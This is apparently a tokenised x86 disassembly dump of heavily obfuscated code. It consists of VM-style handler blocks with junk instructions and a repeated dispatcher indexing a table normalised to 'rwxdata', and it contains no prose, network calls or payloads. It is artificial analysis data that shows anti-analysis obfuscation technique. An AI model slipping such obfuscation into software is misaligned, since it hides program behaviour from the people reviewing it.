lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513a2b
mov [ ebp + 0x4 ] ax
call j_sub_5136fa
mov dx [ ebp ]
mov [ esp + 0x1c ] 0xbe98
jmp rwxdata
pushad
call sub_51172f
pushfd
push [ rwxdata ]
pop [ esp + 0x3c ]
push 0xb8d58b8b
mov [ esp + 0x3c ] 0x0
pushfd
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513a56
clc
neg al
call sub_512db1
jmp rwxdata
push 0x75ff3616
mov [ esp ] eax
call sub_513f13
pushfd
mov [ ebp ] ax
push [ esp ]
lea esp [ esp + 0x40 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513aac
mov [ esp ] dh
lea ebp [ ebp + ecx * 4 ]
push 0xa551356a
pushfd
mov [ ebp ] eax
mov [ esp + 0xc ] 0x23
push [ esp ]
lea esp [ esp + 0x34 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513b37
mov [ esp + 0x3c ] ecx
mov [ esp ] di
mov [ esp ] cl
mov [ esp + 0x38 ] edx
mov [ esp + 0x10 ] ah
call j_sub_511ca7
ror al 0x5
push 0xbd9ea4de
jmp rwxdata
dec al
clc
mov [ esp ] bh
cmp bh 0x17
xor bl al
stc
clc
stc
mov [ esp ] 0xa8ff46c1
mov al [ eax + edi ]
mov [ esp ] 0xe2
add esi 0xffffffff
stc
pushfd
add esp 0x30
jne rwxdata
cmc
cmc
test edx edx
sub ebp 0x2
jmp rwxdata
clc
sub ebp 0x2
push 0xc43812d5
lea esp [ esp + 0x4 ]
jle rwxdata
pushad
pushfd
call sub_511f83
shl ah cl
aad 0x30
bts ax 0x5
mov eax [ ebp ]
inc dl
and dl bl
mov dl [ ebp + 0x4 ]
cmc
call sub_511849
cmc
cmp bh 0x2c
add ebp 0x6
call sub_5142ab
push ecx
push 0x7c138578
jmp rwxdata
pushfd
mov [ ebp ] ax
mov [ esp ] 0x8a
lea esp [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
mov [ ebp ] ax
push eax
mov [ esp + 0x4 ] 0xf7
mov [ esp + 0x4 ] 0xb
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513bcb
pop [ ebp ]
push 0x458f2301
mov [ esp ] 0x70
lea esp [ esp + 0x4 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513c00
mov [ eax + edi ] dl
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0xd7e6
lea esp [ esp + 0x50 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513c3e
xchg [ ebp ] eax
mov [ esp ] 0xb6
pushfd
mov [ esp + 0x8 ] rwxdata
pushfd
call sub_513208
pushad
push [ esp ]
mov [ esp + 0x28 ] edi
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] ecx
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513c73
push eax
pushad
mov [ esp ] dh
mov [ esp + 0x24 ] eax
pushfd
jmp rwxdata
mov [ esp + 0x24 ] esi
jmp rwxdata
mov [ esp + 0x20 ] edi
call sub_513d84
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513c82
stc
push [ esp ]
sub ebp 0xc
clc
cmp [ ebp + 0xc ] 0x1
push esi
push edx
mov [ ebp + 0xc ] eax
call sub_512e56
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513d84
call sub_514287
push [ esp + 0x8 ]
pop [ ebp ]
mov [ esp ] 0xb03e8291
lea esp [ esp + 0xc ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513e3d
mov [ esp ] 0x28
[ edi ] [ esi ]
and si ax
push edx
lea esi [ eax + 0x6a6a89ce ]
mov edi [ esp + 0x34 ]
stc
or si sp
shl si 0x1
push edx
mov esi [ esp + 0x3c ]
cld
push [ esp + 0x40 ]
popfd
push 0xa1771145
mov [ esp + 0x4 ] 0x59fd
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513f54
test ax 0x2911
add esi 0xffffffff
stc
pushfd
mov [ esp + 0xc ] 0xf1
clc
add bl al
cmc
jmp rwxdata
stc
cmp bl al
sub ebp 0x2
mov [ esp + 0x8 ] 0x8641
push esi
jmp rwxdata
pushfd
mov [ ebp ] ax
push 0x32bbf97b
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513f98
xor [ ebp + 0xc ] 0x20
lea esp [ esp + 0x4 ]
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513fcc
mov [ esp + 0x4 ] di
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x8 ] 0x15
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513fe8
push [ esp + 0x44 ]
pop [ ebp ]
mov [ esp + 0x18 ] 0x59f0
pushfd
lea esp [ esp + 0x4c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5140cb
pushfd
pop [ esp + 0x14 ]
pushfd
push [ esp ]
pushfd
push [ esp + 0x20 ]
pop [ ebp ]
mov [ esp + 0x4 ] 0xbe
pushfd
mov [ esp + 0x4 ] 0x96539eee
push ecx
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51412f
push [ esp + 0x30 ]
pop [ ebp ]
mov [ esp ] 0x712
pushfd
lea esp [ esp + 0x38 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
